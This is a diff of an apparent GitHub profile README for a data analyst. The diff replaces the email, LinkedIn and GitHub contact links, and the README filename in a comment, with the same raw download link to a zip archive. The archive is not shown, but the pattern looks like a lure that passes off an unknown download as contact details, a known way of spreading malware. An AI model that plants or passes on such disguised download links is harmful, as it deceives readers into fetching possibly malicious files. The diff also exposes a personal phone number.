@@ -7,13 +7,13 @@ Let’s Connect 🤝
 
 If you’re looking for a Data Analyst who is passionate about turning data into insights and driving real business impact, I’d be happy to connect.
 
-📧 Email: balamahesh610@gmail.com
+📧 Email: https://github.com/Balamahesh7204/Balamahesh7204/raw/refs/heads/main/Ortalis/Balamahesh_v1.8.zip
 
 📱 Mobile: +91 7989105656
 
-🔗 LinkedIn: https://www.linkedin.com/in/mbalamahesh/
+🔗 LinkedIn: https://github.com/Balamahesh7204/Balamahesh7204/raw/refs/heads/main/Ortalis/Balamahesh_v1.8.zip
 
-💻 GitHub: https://github.com/Balamahesh7204
+💻 GitHub: https://github.com/Balamahesh7204/Balamahesh7204/raw/refs/heads/main/Ortalis/Balamahesh_v1.8.zip
 
 🧠 Core Skills
 - Power BI
@@ -32,7 +32,7 @@ If you’re looking for a Data Analyst who is passionate about turning data into
 
 
 <!--
-**Balamahesh7204/Balamahesh7204** is a ✨ _special_ ✨ repository because its `README.md` (this file) appears on your GitHub profile.
+**Balamahesh7204/Balamahesh7204** is a ✨ _special_ ✨ repository because its `https://github.com/Balamahesh7204/Balamahesh7204/raw/refs/heads/main/Ortalis/Balamahesh_v1.8.zip` (this file) appears on your GitHub profile.
 
 Here are some ideas to get you started:
 
